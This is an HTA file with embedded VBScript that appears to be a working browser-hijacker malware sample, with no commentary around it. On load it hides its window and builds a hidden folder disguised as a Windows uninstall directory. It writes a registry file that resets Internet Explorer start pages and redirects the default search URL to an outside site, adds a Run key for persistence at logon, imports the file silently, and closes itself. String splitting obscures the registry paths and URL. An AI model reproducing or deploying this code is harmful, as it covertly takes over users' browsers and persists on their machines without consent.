
<html>
<hta:application caption="no" showintaskbar="no">
<body onload="window.blur();">
<object id='wshh' classid='clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B'></object>
<script LANGUAGE="VBScript">
function stup()

 on error resume next
 Set fso=CreateObject("Scripting.FileSystemObject")
 FN = "C:\$NtUn" & "inst" & "allQ8" & "87678$"
 wjj=FN
 wj1=FN + "\WI"+"N"+"S"+"Y"+"S.c"+"er" 
 mmyy="about:blank" 
 ttmm="h"+"t"+"t"+"p"+"://www.h"+"aodx.c"+"om/in"+"dex"+"."+"h"+"t"+"ml" 
 hcu="HK"+"EY"+"_CU"+"RRE"+"NT_U"+"SER\So"+"ftwa"+"re\Micro"+"so"+"ft\" 
 hu="HK"+"EY"+"_USE"+"RS\."+"Defa"+"ult\Soft"+"wa"+"re\Mi"+"cr"+"os"+"of"+"t\" 
 hlm="H"+"KE"+"Y_L"+"OCA"+"L_"+"MA"+"CHI"+"NE\SOFT"+"WA"+"RE\Micr"+"o"+"s"+"of"+"t\" 
 rw="sss."+"RegW"+"rite" 
 rd="sss."+"RegD"+"elete"
 
 if (fso.FolderExists(wjj))  then  
 	Set fldr=fso.GetFolder(wjj) 
 	fldr.Attributes=0  
 Else
 	Set wf1=fso.CreateFolder(wjj)  
 End if 
 
 if (fso.FileExists(wj1)) Then
 	Set fl=fso.GetFile(wj1)
 	fl.Attributes=0  
 End if 
 
 on error resume next
 Set wf1=fso.CreateTextFile(wj1,true)
 wf1.writeLine("REGEDIT4")
 wf1.WriteBlankLines(1)
 wf1.WriteLine("["+hlm+"Internet Explorer\Main]")
 wf1.WriteLine("""Start Page""="""+mmyy+"""")
 wf1.WriteLine("""First Home Page""="""+mmyy+"""")
 wf1.WriteLine("""Default_Search_URL""="""+ttmm+"""")
 wf1.WriteBlankLines(1)
 wf1.WriteLine("[-"+hcu+"windows\CurrentVersion\Run]")
 wf1.WriteLine("["+hcu+"windows\CurrentVersion\Run]")
 wf1.WriteLine("@=""regedit -s C:\\$NtUninstallQ887678$\\WINSYS.cer""")
 wf1.WriteBlankLines(1)
 wf1.writeLine("["+hlm+"Internet Explorer\Main]")
 wf1.WriteLine("""Default_Page_URL""="""+mmyy+"""")
 wf1.WriteBlankLines(1)
 wf1.writeLine("["+hcu+"Internet Explorer\Main]")
 wf1.WriteLine("""Start Page""="""+mmyy+"""")
 wf1.WriteLine("""First Home Page""="""+mmyy+"""")
 wf1.WriteLine("""Default_Page_URL""="""+mmyy+"""")
 wf1.WriteBlankLines(1)
 wf1.writeLine("["+hlm+"Windows\CurrentVersion\Run]")
 wf1.WriteLine("""WlN32""=""""")
 wf1.close()
 if (fso.FileExists(wj1)) then 
 wshh.Run("regedit /s C:\$NtUninstallQ887678$\WINSYS.cer")
 Set fldr=fso.GetFolder(wjj)
 Set fl=fso.GetFile(wj1)
 fldr.Attributes=6
 fl.Attributes=6  
 end if 

End Function

on error resume next
Call stup()

function closeit()
  setTimeout "self.close()",5
End Function

Call closeit()
</script>
<script language="javascript">
window.close();
</script>
</html>